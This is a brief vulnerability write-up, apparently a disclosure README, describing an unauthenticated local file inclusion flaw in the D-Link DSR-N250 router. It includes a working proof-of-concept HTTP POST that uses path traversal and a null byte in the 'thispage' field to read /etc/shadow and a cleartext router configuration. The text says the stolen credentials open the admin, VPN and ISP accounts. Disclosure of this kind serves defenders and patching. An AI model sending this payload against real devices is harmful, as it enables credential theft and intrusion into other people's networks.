# D-Link-DSR-N250-LFI-Vulnerability

Unauthorized user can access any local file including /etc/passwd,etc/shadow and router configuration file hosted in clear text at location /tmp/teamf1.cfg.asscii. With this information we can login to administration page, VPN site if any is configured, get username and password to get access to ISP portal if user use ADSL internet connection, etc.
 
https://<Router-IP/DNS>/scgi-bin/platform.cgi

   
Proof of Concept
 
Insert relative path into <thispage> field of the HTTP/POST query as follows and you will be able to read a cleartext router configuration:



```POST /scgi-bin/platform.cgi HTTP/1.1
Host: <Router-IP/DNS>
Content-Type: application/x-www-form-urlencoded
Content-Length: 167

thispage=../../../../../../../../../../../../../../../../tmp/teamf1.cfg.ascii%00index.htm&Users.UserName=test&Users.Password=test&button.login.Users.deviceStatus=Login
```
